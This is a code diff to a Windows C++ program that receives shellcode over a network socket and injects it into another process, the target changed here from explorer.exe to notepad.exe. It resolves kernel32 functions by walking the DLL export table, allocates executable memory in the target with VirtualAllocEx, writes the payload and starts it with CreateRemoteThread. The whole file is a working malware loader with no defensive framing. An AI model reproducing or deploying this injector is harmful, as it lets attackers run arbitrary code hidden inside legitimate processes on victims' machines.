@@ -1,8 +1,8 @@
 #include <iostream>
 #include <Windows.h>
 #include <tlhelp32.h>
-
 #pragma comment(lib, "Ws2_32.lib")
+
 
 BOOL EnableWindowsPrivilege(const WCHAR* Privilege)
 {
@@ -24,10 +24,13 @@ BOOL EnableWindowsPrivilege(const WCHAR* Privilege)
 }
 
 LPBYTE getAddress_edata(LPCSTR Dllname, const char* fncName) {
+    //Get base address of DLL
     HMODULE base_addr = GetModuleHandleA(Dllname);
     if (base_addr == NULL) {
         return (LPBYTE)(base_addr);
     }
+    
+    //Get address of dos header for DLL
     PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_addr;
     PIMAGE_NT_HEADERS pe_header = (PIMAGE_NT_HEADERS)((LPBYTE)base_addr + dos_header->e_lfanew);
     IMAGE_OPTIONAL_HEADER imgage_headers_kernel = (IMAGE_OPTIONAL_HEADER)(pe_header->OptionalHeader);
@@ -45,6 +48,7 @@ LPBYTE getAddress_edata(LPCSTR Dllname, const char* fncName) {
     }
     return (LPBYTE)(NULL);
 }
+
 
 DWORD getProcessByName(const std::wstring& name) {
     DWORD pid = 0;
@@ -66,7 +70,7 @@ DWORD getProcessByName(const std::wstring& name) {
     return -1;
 }
 
-typedef HANDLE (NTAPI* create_thread)(
+using create_thread = HANDLE (NTAPI*)(
     HANDLE                 hProcess,
     LPSECURITY_ATTRIBUTES  lpThreadAttributes,
     SIZE_T                 dwStackSize,
@@ -82,7 +86,7 @@ typedef HANDLE (NTAPI* open_process)(
     DWORD dwProcessId
 );
 
-typedef LPVOID (NTAPI* virtualloc_ex)(
+using virtualloc_ex = LPVOID (NTAPI*)(
     HANDLE hProcess,
     LPVOID lpAddress,
     SIZE_T dwSize,
@@ -90,7 +94,7 @@ typedef LPVOID (NTAPI* virtualloc_ex)(
     DWORD  flProtect
 );
 
-typedef BOOL (NTAPI* write_proc_mem)(
+using wirte_proc_mem = BOOL (NTAPI*)(
     HANDLE  hProcess,
     LPVOID  lpBaseAddress,
     LPCVOID lpBuffer,
@@ -114,9 +118,9 @@ int main()
     int addr_len=sizeof(address);
     int shellcode_bytes = 0;
     SOCKET Listensocket = socket(AF_INET, SOCK_STREAM, 0);
-    char buffer[1024];
+    unsigned char buffer[1024];
 
-//    setsockopt(Listensocket, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
+    //    setsockopt(Listensocket, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
 
     if (bind(Listensocket, (SOCKADDR *)&address, sizeof(address)) == SOCKET_ERROR) {
         closesocket(Listensocket);
@@ -135,8 +139,11 @@ int main()
         return -1;
     }
     
+
     memset(buffer, 0, sizeof(buffer));
-    shellcode_bytes = recv(Listensocket, buffer, sizeof(buffer) - 1, 0);
+    shellcode_bytes = recv(Listensocket, (char*)buffer, sizeof(buffer), 0)-1;
+    unsigned char* shellcode = new unsigned char[shellcode_bytes];
+    memcpy(shellcode, buffer, shellcode_bytes);
 
     if (shellcode_bytes == SOCKET_ERROR) {
         closesocket(Listensocket);
@@ -160,7 +167,7 @@ int main()
     create_thread newThread = (create_thread)create_remote_thread_addr;
     wirte_proc_mem WriteProcMem = (wirte_proc_mem)write_proc_mem_addr;
 
-    std::string target_process = "explorer.exe";
+    std::string target_process = "notepad.exe";
     std::wstring target(target_process.begin(), target_process.end());
     int pid = getProcessByName(target);
 
@@ -174,11 +181,12 @@ int main()
         WSACleanup();
         return -1;
     }
-//    HANDLE proc_handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+
     HANDLE proc_handle = (op_process)(PROCESS_ALL_ACCESS, false, pid);
     HANDLE addr = virtual_allocex(proc_handle, NULL, 0x1000, 0x300, 0x40);
-    WriteProcMem(proc_handle, addr, buffer, shellcode_bytes, NULL);
+    WriteProcMem(proc_handle, addr, shellcode, shellcode_bytes, NULL);
     newThread(proc_handle, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL,0, NULL);
+    CloseHandle(proc_handle);
     WSACleanup();
     return 0;
 } 
